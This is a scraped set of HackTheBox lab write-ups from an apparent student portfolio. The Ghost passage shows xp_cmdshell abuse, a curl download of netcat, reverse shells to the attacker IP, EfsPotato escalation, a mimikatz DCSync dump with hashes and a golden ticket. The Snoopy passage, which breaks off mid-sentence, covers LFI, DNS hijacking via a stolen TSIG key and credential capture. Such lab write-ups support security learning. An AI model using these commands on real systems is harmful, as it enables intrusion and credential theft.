EXEC (' EXECUTE AS LOGIN = ''sa''; EXEC xp_cmdshell ''whoami''; REVERT; ') AT [PRIMARY]; The error output shows that the server blocked access to the xp_cmdshell procedure because the procedure is disabled for security reasons. We can enable it with the following query and execute whoami command on the server:
EXEC (' EXECUTE AS LOGIN = ''sa''; EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE; EXEC xp_cmdshell ''whoami''; REVERT; ') AT [PRIMARY]; To get reverse shell from the server, we can upload netcat to the target and then execute it with the command injection query. To upload the binary, start the python listener and use the following query which puts the binary in C:\Users\Public\Documents location of the target:
EXEC (' EXECUTE AS LOGIN = ''sa''; EXEC xp_cmdshell ''curl http://10.10.14.66:8090/nc64.exe -o c:\users\public\documents\nc64.exe''; REVERT; ') AT [PRIMARY]; After the uploading is complete, start the netcat listener on the attacker system:
└─$ rlwrap nc -lvnp 9090 Now use the query to start the reverse shell connection:
EXEC (' EXECUTE AS LOGIN = ''sa''; EXEC xp_cmdshell ''C:\users\public\documents\nc64.exe 10.10.14.66 9090 -e powershell''; REVERT; ') AT [PRIMARY]; SYSTEM Privilege Escalation # We can see that we got a shell as mssqlserver and it has SeImpersonatePrivilege so we can use Potato Exploits. After we upload GodPotato, the Defender immediately removes it from the server. To bypass it, we can use EfsPotato instead, which is undetected by Defender. There are no pre-built binaries available for the exploit, so we have to compile it on the target server.
Transfer the binary to the target and compile it with:
PS C:\Users\Public\Documents> c:\windows\microsoft.net\framework\v4.0.30319\csc.exe EfsPotato.cs -nowarn:1691,618 The EfsPotato.exe will be prepared which we can use to execute commands on the host with SYSTEM privileges. To get the shell as SYSTEM, we can use netcat again to get another reverse shell connection. Open a netcat listener on a new port and use the exploit with command:
PS C:\Users\Public\Documents> .\EfsPotato.exe '.\nc64.exe 10.10.14.66 9091 -e powershell' .\EfsPotato.exe '.\nc64.exe 10.10.14.66 9091 -e powershell' Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability). Part of GMH's fuck Tools, Code By zcgonvh. CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net] [+] Current user: NT Service\MSSQLSERVER [+] Pipe: \pipe\lsarpc [!] binding ok (handle=19b01090) [+] Get Token: 888 [!] process with pid: 700 created. ============================== [x] EfsRpcEncryptFileSrv failed: 1818 The exploit will hang on this but seeing back in the new listener revealed that we successfully gained the SYSTEM reverse shell
ExtraSIDs Golden Ticket Attack # As we are in the PRIMARY host which is the DC of the child domain corp.ghost.htb, we can perform ExtraSIDs attack against the target to compromise the parent domain from the child domain. BloodHound reveals a bidirectional trust relationship between the child and parent domains. Because of this trust, a forged Golden Ticket for the child domain can include the Enterprise Admins SID of the parent domain as an ExtraSID. When the ticket is presented to services in the parent domain, the parent domain honors the Enterprise Admins SID, granting administrative access.
To perform the ExtraSids attack, the attacker needs:
KRBTGT hash of the child domain SID of the child domain Username in the child domain FQDN of the child domain SID of Enterprise Admins group in the parent domain To perform the attack, we can transfer mimikatz.exe and Rubeus.exe to the target system. To extract the KRBTGT hash using mimikatz.exe:
PS C:\Users\Public\Documents> .\mimikatz.exe "lsadump::dcsync /user:krbtgt@corp.ghost.htb" exit .\mimikatz.exe "lsadump::dcsync /user:krbtgt@corp.ghost.htb" exit .#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08 .## ^ ##. "A La Vie, A L'Amour" - (oe.eo) ## / \ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \ / ## > https://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' > https://pingcastle.com / https://mysmartlogon.com ***/ mimikatz(commandline) # lsadump::dcsync /user:krbtgt@corp.ghost.htb [DC] 'corp.ghost.htb' will be the domain [DC] 'PRIMARY.corp.ghost.htb' will be the DC server [DC] 'krbtgt@corp.ghost.htb' will be the user account [rpc] Service : ldap [rpc] AuthnSvc : GSS_NEGOTIATE (9) Object RDN : krbtgt ** SAM ACCOUNT ** SAM Username : krbtgt Account Type : 30000000 ( USER_OBJECT ) User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT ) Account expiration : Password last change : 1/31/2024 7:34:01 PM Object Security ID : S-1-5-21-2034262909-2733679486-179904498-502 Object Relative ID : 502 Credentials: Hash NTLM: 69eb46aa347a8c68edb99be2725403ab ntlm- 0: 69eb46aa347a8c68edb99be2725403ab lm - 0: fceff261045c75c4d7f6895de975f6cb Supplemental Credentials: * Primary:NTLM-Strong-NTOWF * Random Value : 4acd753922f1e79069fd95d67874be4c * Primary:Kerberos-Newer-Keys * Default Salt : CORP.GHOST.HTBkrbtgt Default Iterations : 4096 Credentials aes256_hmac (4096) : b0eb79f35055af9d61bcbbe8ccae81d98cf63215045f7216ffd1f8e009a75e8d aes128_hmac (4096) : ea18711cfd69feef0c8efba75bca9235 des_cbc_md5 (4096) : b3e070025110ce1f * Primary:Kerberos * Default Salt : CORP.GHOST.HTBkrbtgt Credentials des_cbc_md5 : b3e070025110ce1f * Packages * NTLM-Strong-NTOWF * Primary:WDigest * 01 673e591f1e8395d5bf9069b7ddd084d6 02 1344e8aade9169b015f2ca4ddf8a04bd 03 021a6b424b5372ef3511673b04647862 04 673e591f1e8395d5bf9069b7ddd084d6 05 1344e8aade9169b015f2ca4ddf8a04bd 06 122def4643832d604a97c9c02e29cb38 07 673e591f1e8395d5bf9069b7ddd084d6 08 2526b041b761a9ae973e69ee23d8ab97 09 2526b041b761a9ae973e69ee23d8ab97 10 43c410fd94dc2ca31c3d12cd76ea5e5c 11 b51d328dbb94b922331d54ffd54134d5 12 2526b041b761a9ae973e69ee23d8ab97 13 99c658551700bb8b4dbe0503acade3cb 14 b51d328dbb94b922331d54ffd54134d5 15 8a1e17a5a2aa32b2120a39ba99881020 16 8a1e17a5a2aa32b2120a39ba99881020 17 9ebecd6b439ee2e7847819e54be70d8f 18 ff83c6eb25c8da26d5332aeeaeae4cb8 19 2ee6795b19f71e9c5aa2ab2f902a0c55 20 3722d9593e0e483720a657bcb56526b2 21 7bdac8f5dfed431bc7232ff1ca6ebb4d 22 7bdac8f5dfed431bc7232ff1ca6ebb4d 23 42b46cd4462f0d4c4ae5da7757a2ff90 24 7648ab0ac431ceada83b321ca468fccf 25 7648ab0ac431ceada83b321ca468fccf 26 7af11e3e17a21afd61955ed5a5f52405 27 9dfbb554b398bdf2e8c51e1b20208c08 28 49a35ae4b703b7c47b44708fa235c581 29 8a24eb5a1a3155556064b79149b00211 mimikatz(commandline) # exit Bye! From the output, we can copy the domain SID (S-1-5-21-2034262909-2733679486-179904498) and the KRBTGT AES256 hash (b0eb79f35055af9d61bcbbe8ccae81d98cf63215045f7216ffd1f8e009a75e8d)
For the username part, we find no username in the child domain so we will use the Administrator
PS C:\Users\Public\Documents> net user net user User accounts for \\ ------------------------------------------------------------------------------- Administrator Guest krbtgt The command completed with one or more errors. The FQDN of child domain is corp.ghost.htb. And the SID of Enterprise Admins group can be found in the Bloodhound Enterprise Admins node as S-1-5-21-4084500788-938703357-3654145966-519.
With all set, we can forge the ticket with either mimikatz or Rubeus. To use Rubeus, we can use the command:
PS C:\Users\Public\Documents> .\Rubeus-Cust.exe golden /aes256:b0eb79f35055af9d61bcbbe8ccae81d98cf63215045f7216ffd1f8e009a75e8d /domain:corp.ghost.htb /sid:S-1-5-21-2034262909-2733679486-179904498 /sids:S-1-5-21-4084500788-938703357-3654145966-519 /user:Administrator /ptt The ticket can be confirmed with klist
PS C:\Users\Public\Documents> klist Current LogonId is 0:0x3e7 Cached Tickets: (1) #0> Client: Administrator @ CORP.GHOST.HTB Server: krbtgt/corp.ghost.htb @ CORP.GHOST.HTB KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96 Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent Start Time: 7/15/2026 13:15:56 (local) End Time: 7/15/2026 23:15:56 (local) Renew Time: 7/22/2026 13:15:56 (local) Session Key Type: AES-256-CTS-HMAC-SHA1-96 Cache Flags: 0x1 -> PRIMARY Kdc Called: To access the root.txt in the parent domain:
PS C:\Users\Public\Documents> type \\dc01.ghost.htb\c$\Users\Administrator\Desktop\root.txt
summary: LDAP injection to AD forest compromise via Gitea RCE, Kerberos abuse, Golden SAML, linked MSSQL, and ExtraSIDs Golden Ticket attack.
title: Ghost Machine Writeup | HTB

content:
I am a cybersecurity student dedicating my time to mastering hands-on security operations, network penetration testing, and vulnerability research.
This platform is where I drop deep-dive technical walkthroughs, notes from complex lab networks, and research into real-world threat vectors. Dive into my recent writeups below to see how I think, troubleshoot, and exploit.
summary: Offensive Security portfolio featuring deep-dive machine writeups, Web App penetration testing, and Active Directory exploitation notes.
title: Home

content:
Summary # Snoopy is a hard-difficulty Linux machine that demonstrates how multiple seemingly low-impact misconfigurations can be chained into full system compromise. Initial access begins with exploiting a Local File Inclusion (LFI) vulnerability to disclose sensitive BIND9 configuration files and extract the TSIG key used for Dynamic DNS updates. By abusing this key, the mail.snoopy.htb DNS record is redirected to the attacker’s system, allowing interception of Mattermost password reset emails and takeover of a valid user account. Access to Mattermost exposes a custom server provisioning workflow that is abused with an SSH honeypot to capture the credentials of cbrown. From there, a vulnerable git apply sudo rule (CVE-2023-23946) is exploited through a symlink attack to escalate to sbrown. Finally, root access is obtained by abusing an XXE vulnerability in ClamAV (CVE-2023-20052), leaking the root user’s SSH private key during a privileged scan.
Reconnaissance # Rustscan # We start with Rustscan to quickly identify all the open ports from the total of 65535 possible ports.
└─$ rustscan -a 10.129.229.5 -r 0-65535 PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 53/tcp open domain syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Nmap # After identifying the open ports using Rustscan, we will perform detailed enumeration of each open port using Nmap:
└─$ nmap 10.129.229.5 -T4 -sC -sV -p 22,53,80 Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-07 08:34 +0500 Nmap scan report for 10.129.229.5 Host is up (0.096s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 ee:6b:ce:c5:b6:e3:fa:1b:97:c0:3d:5f:e3:f1:a1:6e (ECDSA) |_ 256 54:59:41:e1:71:9a:1a:87:9c:1e:99:50:59:bf:e5:ba (ED25519) 53/tcp open domain ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: SnoopySec Bootstrap Template - Index |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Initial Access # Website & File Download Enumeration # Port 80 shows a website of a security tooling company SnoopySec.
One of the highlighted “here” words in the page downloads a zip file and the other downloads a PDF. The zip file again contains the same PDF file downloaded with other button and also contain an mp4 file of the company’s marketting. The PDF file contains just generic text about what the company does and what services it provides with nothing much interesting for us as pentesters.
In the footer of the page, the email info contains the company email as “info@snoopy.htb”. This reveals that the company’s domain is snoopy.htb which we can add in our /etc/hosts file as:
└─$ sudo nano /etc/hosts 10.129.229.5 snoopy.htb The “About” page contains nothing interesting too but the “Team” page shows the company members with their names, positions and email addresses.
We can save the email addresses in a file for later as they may come in handy:
cschultz@snoopy.htb sbrown@snoopy.htb hangel@snoopy.htb lpelt@snoopy.htb The “Contact” page shows a notification at the top of the page stating “Attention: As we migrate DNS records to our new domain please be advised that our mailserver ‘mail.snoopy.htb’ is currently offline.”
When we try to submit a contact form we see the error that “Unable to load the “PHP Email Form” Library!”
This verbose error tells that the website is using PHP for form handling as from the URL we can only see pages of the website ending in .html extensions. We can try to fuzz for hidden directories to see what it reveals:
└─$ ffuf -u 'http://snoopy.htb/FUZZ' -ic -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50 -fc 404 /'___\ /'___\ /'___\ /\ \__/ /\ \__/ __ __ /\ \__/ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/ \ \_\ \ \_\ \ \____/ \ \_\ \/_/ \/_/ \/___/ \/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://snoopy.htb/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 50 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response status: 404 ________________________________________________ assets [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 185ms] forms [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 190ms] download [Status: 200, Size: 11363570, Words: 0, Lines: 0, Duration: 0ms] Fuzzing for file shows:
└─$ ffuf -u 'http://snoopy.htb/FUZZ' -ic -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 50 -fc 404 /'___\ /'___\ /'___\ /\ \__/ /\ \__/ __ __ /\ \__/ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/ \ \_\ \ \_\ \ \____/ \ \_\ \/_/ \/_/ \/___/ \/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://snoopy.htb/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 50 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response status: 404 ________________________________________________ index.html [Status: 200, Size: 23418, Words: 5514, Lines: 481, Duration: 201ms] contact.html [Status: 200, Size: 10248, Words: 2203, Lines: 243, Duration: 205ms] download.php [Status: 200, Size: 11363570, Words: 0, Lines: 0, Duration: 0ms] . [Status: 200, Size: 23418, Words: 5514, Lines: 481, Duration: 198ms] about.html [Status: 200, Size: 16614, Words: 4023, Lines: 365, Duration: 184ms] team.html [Status: 200, Size: 11115, Words: 2604, Lines: 268, Duration: 202ms] The download directory in the directory bruteforcing output and download.php in file bruteforcing point to the same zip file download when we visit them. This means the website is appending the .php extension itself in the background. Visiting the forms directory shows a 403 error. We can try fuzzing it for files again:
└─$ ffuf -u 'http://snoopy.htb/forms/FUZZ' -ic -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 50 -fc 404 /'___\ /'___\ /'___\ /\ \__/ /\ \__/ __ __ /\ \__/ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/ \ \_\ \ \_\ \ \____/ \ \_\ \/_/ \/_/ \/___/ \/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://snoopy.htb/forms/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 50 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response status: 404 ________________________________________________ contact.php [Status: 200, Size: 44, Words: 8, Lines: 1, Duration: 195ms] . [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 207ms] We see a contact.php which while accessing shows the same error we saw when submitting the email on the contact form.
The endpoint that downloads the single PDF file is using URL with the file parameter as:
http://snoopy.htb/download?file=announcement.pdf We can try checking if it is vulnerable to LFI or not. Testing for common payloads “../../../../../” failed but after analyzing the behaviour of the site with different formats revealed that the site is removing the “../” sequences. The application likely performs a single, non-recursive str_replace("../", “”, $input). Because the replacement only runs once, if we submit ….//, removing the single ../ substring from the middle leaves behind ../. Chaining several of these (….//….//….//….//etc/passwd) reconstructs a full traversal path after the filter runs. This is a classic non-recursive-sanitization bypass.
Pointing the payload to the /etc/passwd file downloads it successfully in a zip format.
We can try more LFI payloads for system enumeration and the site will zip the accessible files and sends it to us for download. To download the download.php file which is handling these downloads, we can use payload:
http://snoopy.htb/download?file=....//download.php The file has following code
The download.php script dynamically creates a ZIP archive using PHP’s ZipArchive class. When the file GET parameter is supplied, it prepends the press_package/ directory to the user-controlled filename, performs a simple ../ string replacement with preg_replace(), verifies that the resulting file exists, and adds it to a temporary ZIP archive. If no file parameter is provided, the script packages every file inside the press_package/ directory. Finally, it serves the generated archive to the client as press_release.zip and deletes the temporary ZIP file from the server.
As the code is not using any function which can include and then execute PHP scripts, we can’t get RCE via php script inclusion. Let’s move towards downloading the contact.php to see what it contains via LFI:
http://snoopy.htb/download?file=....//forms/contact.php The contact.php script acts as the backend for the website’s contact form. It loads the PHP_Email_Form library, accepts user-supplied input from the POST parameters (name, email, subject, and message), constructs an email, and sends it to a predefined recipient address using the library’s send() method.
When trying to download the mentioned PHP email library, the zip file that gets downloaded is empty so maybe the file doesn’t exist.
Mattermost Account Takeover via DNS Manipulation # We can fuzz for subdomains now:
└─$ ffuf -u 'http://snoopy.htb/' -H 'Host: FUZZ.snoopy.htb' -ic -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 50 -fc 404 -fs 0,23418 /'___\ /'___\ /'___\ /\ \__/ /\ \__/ __ __ /\ \__/ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/ \ \_\ \ \_\ \ \____/ \ \_\ \/_/ \/_/ \/___/ \/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://snoopy.htb/ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt :: Header : Host: FUZZ.snoopy.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 50 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response size: 0,23418 :: Filter : Response status: 404 ________________________________________________ mm [Status: 200, Size: 3132, Words: 141, Lines: 1, Duration: 190ms] There’s a response from mm subdomain which we can visit after adding it to our /etc/hosts file:
10.129.229.5 snoopy.htb mm.snoopy.htb The subdomain shows a MatterMost application.
Clicking the “Don’t have an account?” button shows a page about contacing the workspace admin
We don’t have valid login credentials until now and trying the emails we collected from the website with default credentials shows no success. The “Forgot your password?” button shows a password recovery page where we can enter emails to get recovery link. When trying to get an email for sbrown’s address, we see the error below
But when we tried to get a password reset email for an arbitrary email address, it shows the message that if that mail exists the reset link will be sent.
So for the emails that exist in the website’s database, it throws error as it has to send the recovery mail but for those arbitrary ones, it doesn’t throw error because it doesn’t send the mail in the first place so it doesn’t reach the error stage. From the earlier notification of the Contact page from the snoopy.htb, they said mail.snoopy.htb is offline so this can be the reason the emails are not sent.
DNS port on the host is also accessible so let’s try enumerating the DNS entries. For zone transfer query (AXFR), we see results as:
└─$ dig @10.129.229.5 snoopy.htb AXFR ; <<>> DiG 9.20.20-1-Debian <<>> @10.129.229.5 snoopy.htb AXFR ; (1 server found) ;; global options: +cmd snoopy.htb. 86400 IN SOA ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400 snoopy.htb. 86400 IN NS ns1.snoopy.htb. snoopy.htb. 86400 IN NS ns2.snoopy.htb. mattermost.snoopy.htb. 86400 IN A 172.18.0.3 mm.snoopy.htb. 86400 IN A 127.0.0.1 ns1.snoopy.htb. 86400 IN A 10.0.50.10 ns2.snoopy.htb. 86400 IN A 10.0.51.10 postgres.snoopy.htb. 86400 IN A 172.18.0.2 provisions.snoopy.htb. 86400 IN A 172.18.0.4 www.snoopy.htb. 86400 IN A 127.0.0.1 snoopy.htb. 86400 IN SOA ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400 ;; Query time: 204 msec ;; SERVER: 10.129.229.5#53(10.129.229.5) (TCP) ;; WHEN: Thu Jul 09 18:31:08 PKT 2026 ;; XFR size: 11 records (messages 1, bytes 325) From the output we can see some subdomains but their A records are pointing to private IP range so they are not accessible directly. Resolving for A records of mail.snoopy.htb failed and didn’t return any records.
The DNS is using “ISC BIND 9” server. We can search for what pentests can be performed on it. Researching for it, we find one method that looks useful for our current scenario which is “Dynamic DNS (DDNS) Flaws”. This says that if weak or unauthenticatef policies are set, we can modify the DNS records remotely. The configuration of the server is stored in /etc/bind/named.conf and as we have LFI, we can see if we can access the file.
Downloading and reviewing the file we see the above contents. There is secret key based authentication setup for DNS records modification. It may become useful for us. Reviewing the /etc/bind/named.conf.local file shows content
The named.conf.local file contains the local BIND DNS configuration and defines the DNS zones for which the server is authoritative. In this case, the server is configured as the master for the snoopy.htb zone, with all DNS records stored in the /var/lib/bind/db.snoopy.htb zone file. The configuration also allows authenticated Dynamic DNS updates using the rndc-key TSIG key through the allow-update directive, while restricting DNS zone transfers to hosts within the 10.0.0.0/8 network via the allow-transfer directive. With this information at hand, we can update the DNS records to point the mail.snoopy.htb domain to our IP address and check if we can receive the reset password mail from Mattermost recovery feature. To modify the records, we can use nsupdate with the key file (rndc.key). Copy the key contents into a file:
key "rndc-key" { algorithm hmac-sha256; secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA="; }; Now we can perform DNS modification with commands:
└─$ nsupdate -k rndc.key > server snoopy.htb > update add mail.snoopy.htb 300 A 10.10.14.66 > send > To see if the modification is successfull, we can perform DNS resolution of the subdomain with:
└─$ dig @10.129.229.5 mail.snoopy.htb A ; <<>> DiG 9.20.20-1-Debian <<>> @10.129.229.5 mail.snoopy.htb A ; (1 server found) ;; global options: +cmd ;; Got answer: ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 50928 ;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; WARNING: recursion requested but not available ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 1232 ; COOKIE: 8358a73036a6603d010000006a4fa7bcd6ba617e50230bbf (good) ;; QUESTION SECTION: ;mail.snoopy.htb. IN A ;; ANSWER SECTION: mail.snoopy.htb. 300 IN A 10.10.14.66 ;; Query time: 284 msec ;; SERVER: 10.129.229.5#53(10.129.229.5) (UDP) ;; WHEN: Thu Jul 09 18:52:58 PKT 2026 ;; MSG SIZE rcvd: 88 NOTE: The records are reset again after some minutes so try to perform the modification again to get the subdomain point back to us.
The records of mail.snoopy.htb are now pointing to our attack machine IP 10.10.14.66. We can start a SMTP server with aiosmtpd. aiosmtpd is a Python package that implements a functional SMTP server. Running it lets us receive the password-reset email Mattermost sends once mail.snoopy.htb resolves to our IP.
We can start it with:
python3 -m aiosmtpd -n -l 10.10.14.66:25 With that set, we can go to the Mattermost password recovery feature and put an email address to get a recovery link. This time the website page outputs no error and our terminal shows the received email’s content:
The reset password link is given in the email which we can use to reset the password but before that, we need to clean it as it contains some encoding characters:
http://mm.snoopy.htb/reset_password_complete?token=3Diamxk= r9msqsxxg5hcuoztwydqtu38w793z8fsmduqupimsz5tcpmo6s1d8smn4ee Email bodies are often quoted-printable encoded. In this encoding, a trailing = at the end of a line is a soft line-break marker (not a real character), while =3D represents a literal =. To reconstruct the real link, remove the soft-break = characters and join the lines, then replace =3D with =.
So after cleaning, our link will look like:
http://mm.snoopy.htb/reset_password_complete?token=iamxkr9msqsxxg5hcuoztwydqtu38w793z8fsmduqupimsz5tcpmo6s1d8smn4ee Visit the cleaned link and reset the password
After log in, we see chats in “Town Square” channel
Server Provisioning Credential Capture # There is discussion going on about submitting requests for new server provisions. The user “cbrown” created a dedicated channel for the requests but searching for the channel we find it’s empty.
Above the chat box area, we see a visible to us only message about using the /server_provision slash command if we need assistance in server provisions.
Using the mentioned command in the chat box opens a separate request form for us with the necessary fields to be filled
We can fill out the form giving our IP in the “Server IP address” field.
We can start a netcat listener on port 2222 to see if we get a connection back:
└─$ netcat -lvnp 2222 After submitting the request, we get a message from cbrown
Looking back in the netcat listener there is a connection.
As the user is trying to get into the port 2222 via SSH, we need to start a proper SSH server there. To also monitor what the user does in there, we can perform SSH logging and for this, running a SSH honeypot is the best solution. We can find open-source SSH honeypots on GitHub. The one that I found while researching is sshesame. It has pre-compiled binaries which we can use for quick setup. Download the binaries according to your system architecture from link. The config file we need to use with the binary is available at link. Modify the configuration file to run the SSH service on port 2222 and then start the server with:
└─$ ./sshesame-linux-amd64 -config sshesame.yaml After that submit another server provision request in the website. This time the message of cbrown changed from “i wasn’t able to ping this server. submit a request later when it’s up” to “ill try in a minute…” and looking back in the terminal we see the connection logs:
From there we see the credentials of cbrown as “sn00pedcr3dential!!!”. We can reuse them on the SSH port to log in as cbrown:
└─$ ssh cbrown@10.129.229.5 The directory of user is empty. Seeing what other users have home directory revealed only one:
cbrown@snoopy:~$ ls -la /home total 16 drwxr-xr-x 4 root root 4096 Mar 19 2023 . drwxr-xr-x 19 root root 4096 Apr 25 2023 .. drwxr-x--- 4 cbrown cbrown 4096 Jul 8 20:06 cbrown drwxr-x--- 5 sbrown sbrown 4096 Jul 8 21:05 sbrown Git Apply Symlink Abuse # We don’t have permissions to access the directory of sbrown. Checking the sudoers permissions with “sudo -l” revealed the following:
cbrown@snoopy:~$ sudo -l [sudo] password for cbrown: Matching Defaults entries for cbrown on snoopy: env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass User cbrown may run the following commands on snoopy: (sbrown) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$ We can run the specific git apply command with the privileges of sbrown. git apply is a Git utility used to apply patch files, which contain changes to files in a repository. Researching vulnerabilities affecting this functionality reveals CVE-2023-23946. The vulnerability exploits git apply by crafting a malicious patch file that creates a symbolic link and then writes arbitrary file using it. We find a POC at GitHub.
To exploit the vulnerability, we first need to create a symlink pointing to the directory where we want to write files. To escalate to sbrown, we will need to write the SSH pblic key to its authorized_keys files so we can later log in using the corresponding private key. To create the symlink:
cbrown@snoopy:~$ mkdir /tmp/git-exploit && cd /tmp/git-exploit cbrown@snoopy:/tmp/git-exploit$ ln -s /home/sbrown/.ssh symlink Create SSH keys on attack system using :
└─$ ssh-keygen -t ed25519 -f key -N "" Next we can copy the patch file content from the GitHub repo and edit it as follows:
diff --git a/symlink b/newsymlink rename from symlink rename to newsymlink -- diff --git /dev/null b/newsymlink/authorized_keys new file mode 100644 index 0000000..e47f4ea --- /dev/null +++ b/newsymlink/authorized_keys @@ -0,0 +1 @@ +<Public-KEY HERE> \ No newline at end of file Add your public key in the placeholder.
This patch file does two things: first it renames the existing symlink (which points to /home/sbrown/.ssh) to newsymlink. Then it creates a new file authorized_keys inside newsymlink. Because newsymlink is still a symlink to /home/sbrown/.ssh, git actually writes the file through the symlink, landing at /home/sbrown/.ssh/authorized_keys.
As the user sbrown is also in devops group just like us, we can change the ownership of the directory so sbrown can also access the directory and create the newsymlink as specified in the patch:
cbrown@snoopy:/tmp/git-exploit$ chown :devops . cbrown@snoopy:/tmp/git-exploit$ ls -la total 12 drwxrwxr-x 2 cbrown devops 4096 Jul 9 15:44 . drwxrwxrwt 13 root root 4096 Jul 9 15:44 .. -rw-rw-r-- 1 cbrown cbrown 357 Jul 9 15:44 malicious.patch lrwxrwxrwx 1 cbrown cbrown 17 Jul 9 15:41 symlink -> /home/sbrown/.ssh To apply the malicious patch as sbrown now:
cbrown@snoopy:/tmp/git-exploit$ sudo -u sbrown /usr/bin/git apply -v malicious.patch [sudo] password for cbrown: Checking patch symlink => newsymlink... Checking patch newsymlink/authorized_keys... Applied patch symlink => newsymlink cleanly. Applied patch newsymlink/authorized_keys cleanly. Restrict permissions of the key file to 600 and log in with SSH using the private key:
└─$ chmod 600 key └─$ ssh -i key sbrown@10.129.229.5 We can now access the user.txt present in sbrown’s home directory:
sbrown@snoopy:~$ ls -l drwxrwxr-x 2 sbrown sbrown 4096 Jul 8 20:54 scanfiles -rw-r----- 1 root sbrown 33 Jul 8 17:16 user.txt Escalating Privileges # ClamAV XXE File Disclosure # Running sudo -l shows the clamscan command which we can run as root now:
sbrown@snoopy:~$ sudo -l Matching Defaults entries for sbrown on snoopy: env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass User sbrown may run the following commands on snoopy: (root) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$ Clamscan is a command-line antivirus utility, part of the ClamAV toolkit, used to scan files and directories for malware.
We can run the tool by specifying a file or directory to scan and –debug is used to show libclamav’s debug messages. We can take the version of the tool (ClamAV 1.0.0) and search for vulnerabilities. The mentioned version is affected by multiple vulnerabilities from which CVE-2023-20052 is the one which has XML External Entity (XXE) injection vulnerability in the DMG file parser that leaks sensitive data.
XXE (XML External Entity injection) occurs when an XML parser resolves externally-defined entities in untrusted input. If an attacker can supply a <!ENTITY> pointing to a local file (file:///…), and the parser expands it and reflects the value back, the attacker can read arbitrary files the parsing process has access to.
As the tool will run with the root privileges, we can try to leak SSH private keys if the root directory contains them. We can exploit this vulnerability by submitting a crafted DMG file to be scanned by ClamAV.
Searching for whether dmg files contain XML, we find the answer as
